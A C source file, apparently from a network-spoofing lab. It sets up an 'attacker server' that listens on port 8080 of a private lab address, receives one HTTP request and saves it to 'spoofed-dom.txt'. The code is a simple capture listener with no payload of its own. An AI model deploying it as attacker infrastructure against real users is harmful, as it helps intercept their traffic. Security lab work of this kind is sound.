#include <string.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netinet/ip.h>

#define __MY_DEBUG__


#define ATTACKER_SERVER_ADDR 192, 168, 1, 201
#define ATTACKER_CLIENT_ADDR 192, 168, 1, 202
#define WEB_SERVER_ADDR 192, 168, 1, 203

#define FILE_NAME "spoofed-dom.txt"

union address {
    uint8_t fields[4];
    uint32_t l;
};

enum {
    MAX_ITERS = 20,
    WIRE_LEN = 4096,
    IP_ID = 0x1222,
    CLIENT_PORT = 12345,
    ATTACKER_SERVER_PORT = 34567,
};

int32_t create_socket() {
    int32_t sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd <= 0) {
        #ifdef __MY_DEBUG__
                printf("create socket failed...\n");
        #endif
                close(sockfd);
                exit(0);
    }

    return sockfd;
}

void _listen(const int32_t sockfd) {
    if (listen(sockfd, 5) < 0) {
#ifdef __MY_DEBUG__
        printf("listen failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _bind(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
           const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (bind(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("bind failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

int32_t _accept(const int32_t sockfd) {
    struct sockaddr addr = {0};
    socklen_t addrlen = sizeof(addr);
    int32_t clientfd = accept(sockfd, &addr, &addrlen);
    if (clientfd < 0) {
#ifdef __MY_DEBUG__
        printf("accept failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
    return clientfd;
}

size_t _recv(const int32_t sockfd, void *  buf, size_t size) {
    ssize_t sz = recv(sockfd, buf, size, 0);
    if (sz < 0) {
#ifdef __MY_DEBUG__
        printf("recv failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
    return (size_t)sz;
}

FILE *_fopen(const char *restrict path) {
    FILE * file = fopen(path, "w");
    if (file == 0) {
        #ifdef __MY_DEBUG__
                printf("fopen failed...\n");
        #endif
                exit(0);
    }
    return file;
}

size_t _fwrite(const void *restrict ptr, size_t size, size_t nitems, FILE *restrict stream) {
    size_t written = fwrite(ptr, size, nitems, stream);

    if (written < nitems) {
        #ifdef __MY_DEBUG__
            printf("fwrite failed...\n");
        #endif
        exit(0);
    }

    return written;
}

void _connect(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
           const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (connect(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("connect failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void recv_write(int32_t sockfd, FILE *file) {
    enum {
        CHUNK = 16
    };
    char * buf = malloc(CHUNK);
    size_t size = 0;
    *buf = 0;
    char *header_end=0;
    size_t recvd;

    while (1) {
        recvd = _recv(sockfd, buf + size, CHUNK - 1);
        if (!recvd) {
            break;
        }

        size += recvd;
        buf = realloc(buf, size+CHUNK);
        buf[size] = 0;

        header_end = strstr(buf, "\r\n\r\n");

        if (header_end) {
            break;
        }
    }
    char Content_Length[] = "Content-Length: ";
    size_t content_len = (size_t)atoi(strstr(buf, Content_Length) + sizeof(Content_Length)-1);
    size_t body_recvd = size - (size_t)(header_end+4-buf); //how much we already received from the body after the header ends
    size_t body_left = content_len - body_recvd;
    buf = realloc(buf, body_left+size+1);
    recvd = _recv(sockfd, buf + size, body_left);
    size = size + recvd;

    _fwrite(buf, size, 1, file);
    free(buf);
}

void reuse(const int32_t sockfd) {
    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt,
                   sizeof(opt)) < 0) {
#ifdef __MY_DEBUG__
        printf("setsockopt(SO_REUSEADDR) failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
    opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt,
                   sizeof(opt)) < 0) {
#ifdef __MY_DEBUG__
        printf("setsockopt(SO_REUSEPORT) failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

int32_t main() {
    int32_t sockfd = create_socket();
    reuse(sockfd);

    _bind(sockfd, ATTACKER_SERVER_ADDR, 8080);

    _listen(sockfd);

    int32_t clientfd = _accept(sockfd);
    FILE *file = _fopen(FILE_NAME);

    recv_write(clientfd, file);

    fclose(file);
    close(sockfd);
    close(clientfd);

}
